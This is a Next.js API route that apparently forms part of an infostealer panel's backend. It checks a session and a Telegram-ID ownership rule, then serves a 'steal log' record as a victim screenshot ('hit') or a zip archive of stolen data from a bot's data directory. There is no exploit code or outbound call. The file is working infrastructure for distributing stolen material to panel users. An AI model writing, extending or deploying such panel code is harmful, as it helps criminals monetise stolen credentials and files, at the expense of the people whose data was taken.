import fs from "fs";
import path from "path";
import { NextRequest, NextResponse } from "next/server";
import { isAdminSession, requireSession } from "@/lib/auth";
import { botDir, getStealLog } from "@/lib/db";

export const runtime = "nodejs";

function screenPath(row: { id: number; meta_json: string | null }) {
  try {
    const meta = JSON.parse(row.meta_json || "{}") as { screen_path?: string };
    if (meta.screen_path && typeof meta.screen_path === "string") return meta.screen_path;
  } catch {
  }
  return path.join("hits", `${row.id}.png`).replace(/\\/g, "/");
}

export async function GET(
  req: NextRequest,
  ctx: { params: Promise<{ id: string }> },
) {
  const sess = await requireSession();
  if (!sess) return NextResponse.json({ error: "auth" }, { status: 401 });
  const { id } = await ctx.params;
  if (!/^\d+$/.test(id)) return NextResponse.json({ error: "bad" }, { status: 400 });
  const row = await getStealLog(Number(id));
  if (!row) return NextResponse.json({ error: "not found" }, { status: 404 });
  if (!isAdminSession(sess) && Number(row.tg_id) !== sess.tgId) {
    return NextResponse.json({ error: "not found" }, { status: 404 });
  }

  const want = req.nextUrl.searchParams.get("t") || "zip";
  if (want === "png" || want === "screen") {
    const rel = screenPath(row);
    const abs = path.isAbsolute(rel) ? rel : path.join(botDir(), "data", rel);
    if (!fs.existsSync(abs)) return NextResponse.json({ error: "png missing" }, { status: 404 });
    const buf = fs.readFileSync(abs);
    return new NextResponse(buf, {
      status: 200,
      headers: {
        "Content-Type": "image/png",
        "Content-Disposition": `inline; filename="hit-${row.id}.png"`,
        "Content-Length": String(buf.length),
      },
    });
  }

  if (!row.zip_path) return NextResponse.json({ error: "zip missing" }, { status: 404 });
  const abs = path.isAbsolute(row.zip_path)
    ? row.zip_path
    : path.join(botDir(), "data", row.zip_path);
  if (!fs.existsSync(abs)) return NextResponse.json({ error: "zip missing" }, { status: 404 });
  const buf = fs.readFileSync(abs);
  return new NextResponse(buf, {
    status: 200,
    headers: {
      "Content-Type": "application/zip",
      "Content-Disposition": `attachment; filename="hit-${row.id}.zip"`,
      "Content-Length": String(buf.length),
    },
  });
}
